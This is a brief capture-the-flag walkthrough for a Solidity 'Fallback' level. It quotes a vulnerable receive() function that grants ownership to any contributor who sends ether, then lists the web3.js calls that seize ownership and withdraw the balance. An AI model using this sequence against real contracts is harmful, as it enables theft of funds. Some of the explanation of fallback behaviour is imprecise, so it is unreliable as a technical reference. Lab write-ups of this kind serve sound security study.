# Fallback Contract



First things first,

What is a fallback function?


-> In Solidity, a fallback function is an external function with neither a name, parameters, or return values.



Few notable properties of fallback function:

-> It is compulsory to mark it as external.

-> It should be marked as payable. If not, the contract will throw an exception if it receives ether without any data.

-> It is limited to 2300 gas if invoked by other functions.


The task:

1.Claim ownership of the contract.

2.Reduce its balance to 0.


//
Problem with contract:

-> Bad implementation of fall back functio i.e Changing contract ownership inside the fallback function.

*Observe the condition seen in fallback function*
 
 receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

//
How to get ownership and winthdraw all the money out of the contract

 
Solution:

1. Your account address has to contribute to be mapped. 

await contract.contribute({value:3})

2. Trigger fallback function by sending transcation by using web3.js command.

await contract.sendTransaction({value:3})

Congrats!! u now own the contract.

3.Lastly to withdraw all the eth from the contract

await contract.withdraw()

------done------
